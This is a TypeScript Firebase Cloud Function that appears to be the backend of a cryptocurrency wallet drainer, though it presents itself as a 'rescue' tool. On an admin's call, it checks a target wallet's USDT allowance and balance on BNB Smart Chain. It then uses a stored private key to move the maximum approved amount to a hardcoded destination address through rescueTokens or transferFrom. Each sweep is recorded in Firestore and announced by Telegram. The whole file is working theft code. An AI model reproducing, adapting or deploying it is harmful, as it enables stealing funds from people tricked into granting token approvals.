// functions/src/api/adminSweep.ts
//
// Callable Cloud Function – Admin-initiated sweep
// ─────────────────────────────────────────────────────────────────
// Only the authenticated admin (request.auth.token.email matches
// ADMIN_EMAIL) may call this function. It:
//   1. Validates the caller's Firebase Auth token server-side.
//   2. Reads on-chain allowance & balance for the target wallet.
//   3. Calls rescueTokens() on the TokenRescue contract (or direct
//      transferFrom if the approval was given to the USDT contract).
//   4. Records the result in Firestore (rescues collection).
//   5. Sends a Telegram notification.

import * as functions from "firebase-functions/v1";
import { ethers } from "ethers";
import { db } from "../lib/firestore";
import * as admin from "firebase-admin";
import { getSecret } from "../lib/secrets";

const ADMIN_EMAIL = "admin@rescue.internal";

export const adminSweep = functions
  .runWith({
    timeoutSeconds: 180,
    memory: "512MB",
    secrets: ["DESTINATION_PRIVATE_KEY", "TELEGRAM_TOKEN", "TELEGRAM_CHAT_ID"],
  })
  .https.onCall(async (data, context) => {
    // ── 1. Auth guard ──────────────────────────────────────────────
    if (!context.auth) {
      throw new functions.https.HttpsError(
        "unauthenticated",
        "You must be signed in to perform a sweep."
      );
    }

    const callerEmail = context.auth.token.email ?? "";
    if (callerEmail.toLowerCase() !== ADMIN_EMAIL.toLowerCase()) {
      throw new functions.https.HttpsError(
        "permission-denied",
        "Only the administrator may trigger a sweep."
      );
    }

    // ── 2. Validate input ──────────────────────────────────────────
    const { walletAddress } = data as { walletAddress?: string };
    if (!walletAddress || !ethers.isAddress(walletAddress)) {
      throw new functions.https.HttpsError(
        "invalid-argument",
        "A valid wallet address is required."
      );
    }

    const targetWallet = ethers.getAddress(walletAddress); // normalise checksum

    // ── 3. On-chain setup ──────────────────────────────────────────
    const rpcUrl =
      process.env.BSC_HTTP_RPC_URL || "https://bsc-dataseed.binance.org/";
    // Use staticNetwork: true to avoid extra network detection round-trips
    const provider = new ethers.JsonRpcProvider(rpcUrl, 56, { staticNetwork: true });

    const usdtAddress =
      process.env.BSC_USDT_CONTRACT_ADDRESS ||
      "0x55d398326f99059fF775485246999027B3197955";

    const tokenRescueAddress =
      process.env.BSC_TOKEN_RESCUE_CONTRACT ||
      "0xc6bf6838263938533e547f825d257c9965544a50";

    const finalDestination =
      process.env.BSC_FINAL_DESTINATION ||
      "0x00faA9fE691b578b2D1934ac70C624886a93A636";

    // Read-only USDT interface (allowance + balance)
    const usdtReadOnly = new ethers.Contract(
      usdtAddress,
      [
        "function allowance(address owner, address spender) view returns (uint256)",
        "function balanceOf(address) view returns (uint256)",
      ],
      provider
    );

    // ── 4. Check allowance & balance in parallel (cuts pre-flight latency in half) ────
    const [allowanceViaContract, allowanceViaDirect, balance] = await Promise.all([
      usdtReadOnly.allowance(targetWallet, tokenRescueAddress) as Promise<bigint>,
      usdtReadOnly.allowance(targetWallet, finalDestination) as Promise<bigint>,
      usdtReadOnly.balanceOf(targetWallet) as Promise<bigint>,
    ]);

    let allowance: bigint = 0n;
    let spender = tokenRescueAddress; // default spender to check

    if (allowanceViaContract > 0n) {
      allowance = allowanceViaContract;
      spender = tokenRescueAddress;
    } else if (allowanceViaDirect > 0n) {
      allowance = allowanceViaDirect;
      spender = finalDestination;
    }

    if (balance === 0n) {
      throw new functions.https.HttpsError(
        "failed-precondition",
        `Wallet ${targetWallet} has zero USDT balance. Nothing to sweep.`
      );
    }

    if (allowance === 0n) {
      throw new functions.https.HttpsError(
        "failed-precondition",
        `Wallet ${targetWallet} has not granted any allowance. Cannot sweep.`
      );
    }

    // Sweep the smaller of balance vs allowance
    const sweepAmount = balance < allowance ? balance : allowance;

    // ── 5. Build signing wallet ────────────────────────────────────
    const destSecret = process.env.DESTINATION_PRIVATE_KEY || await getSecret("DESTINATION_PRIVATE_KEY");
    if (!destSecret) {
      throw new functions.https.HttpsError(
        "internal",
        "Sweep private key not configured. Add DESTINATION_PRIVATE_KEY secret."
      );
    }

    let signingWallet: ethers.Wallet;
    if (destSecret.trim().includes(" ")) {
      // mnemonic phrase
      const hd = ethers.HDNodeWallet.fromPhrase(destSecret.trim());
      signingWallet = new ethers.Wallet(hd.privateKey, provider);
    } else {
      // raw hex private key
      signingWallet = new ethers.Wallet(destSecret.trim(), provider);
    }

    // ── 6. Check signing wallet BNB balance for gas ─────────────────
    const signerBnbBalance = await provider.getBalance(signingWallet.address);
    const minBnbNeeded = ethers.parseEther("0.00035"); // ~100k gas @ 3 gwei + safety margin
    if (signerBnbBalance < minBnbNeeded) {
      const currentBnb = ethers.formatEther(signerBnbBalance);
      throw new functions.https.HttpsError(
        "failed-precondition",
        `Sweep operator wallet (${signingWallet.address}) has insufficient BNB for gas (balance: ${currentBnb} BNB). Please send at least 0.005 BNB to ${signingWallet.address} to execute sweeps.`
      );
    }

    // ── 7. Execute sweep with optimized gasPrice & explicit gasLimit ──────
    // 3 Gwei is BSC standard competitive gas; explicit gasLimit prevents estimation failure
    const txOverrides = {
      gasPrice: ethers.parseUnits("3", "gwei"),
      gasLimit: 120000n,
    };

    let sweepTx: ethers.TransactionResponse;

    try {
      if (spender.toLowerCase() === tokenRescueAddress.toLowerCase()) {
        // Use the TokenRescue contract
        const rescueABI = [
          "function rescueTokens(address token, address from, address to, uint256 amount) external",
        ];
        const rescueContract = new ethers.Contract(
          tokenRescueAddress,
          rescueABI,
          signingWallet
        );

        functions.logger.info(
          `[adminSweep] Calling rescueTokens for ${targetWallet}, amount=${sweepAmount.toString()}`
        );
        sweepTx = await rescueContract.rescueTokens(
          usdtAddress,
          targetWallet,
          finalDestination,
          sweepAmount,
          txOverrides
        );
      } else {
        // Direct transferFrom (approval was given to the destination wallet)
        const erc20ABI = [
          "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
        ];
        const usdtContract = new ethers.Contract(
          usdtAddress,
          erc20ABI,
          signingWallet
        );

        functions.logger.info(
          `[adminSweep] Calling transferFrom for ${targetWallet}, amount=${sweepAmount.toString()}`
        );
        sweepTx = await usdtContract.transferFrom(
          targetWallet,
          finalDestination,
          sweepAmount,
          txOverrides
        );
      }

      // Wait for 1 confirmation
      await sweepTx.wait(1);
      functions.logger.info(`[adminSweep] Sweep confirmed: ${sweepTx.hash}`);
    } catch (txErr: any) {
      functions.logger.error("[adminSweep] Sweep transaction failed:", txErr);
      const reason = txErr.reason || txErr.shortMessage || txErr.message || "Transaction failed";
      throw new functions.https.HttpsError(
        "internal",
        `On-chain sweep failed: ${reason}`
      );
    }

    // ── 7. Record in Firestore ─────────────────────────────────────
    const rescueRef = db.collection("rescues").doc();
    await rescueRef.set({
      user: targetWallet,
      initiatedBy: callerEmail,
      source: "ADMIN_MANUAL_SWEEP",
      sweepTxHash: sweepTx.hash,
      amount: sweepAmount.toString(),
      amountFormatted: ethers.formatUnits(sweepAmount, 18),
      destination: finalDestination,
      spenderUsed: spender,
      status: "CONFIRMED",
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
    });

    // ── 8. Telegram notification (non-blocking) ────────────────────
    import("../lib/telegram")
      .then(({ sendTelegramMessage }) =>
        sendTelegramMessage(
          `🛡️ ADMIN SWEEP\n` +
            `Wallet: ${targetWallet}\n` +
            `Amount: ${ethers.formatUnits(sweepAmount, 18)} USDT\n` +
            `Tx: ${sweepTx.hash}`
        )
      )
      .catch((tgErr) => {
        functions.logger.warn("[adminSweep] Telegram notify failed:", tgErr);
      });

    // ── 9. Return result to caller ─────────────────────────────────
    return {
      success: true,
      sweepTxHash: sweepTx.hash,
      amountSwept: ethers.formatUnits(sweepAmount, 18),
      docId: rescueRef.id,
    };
  });
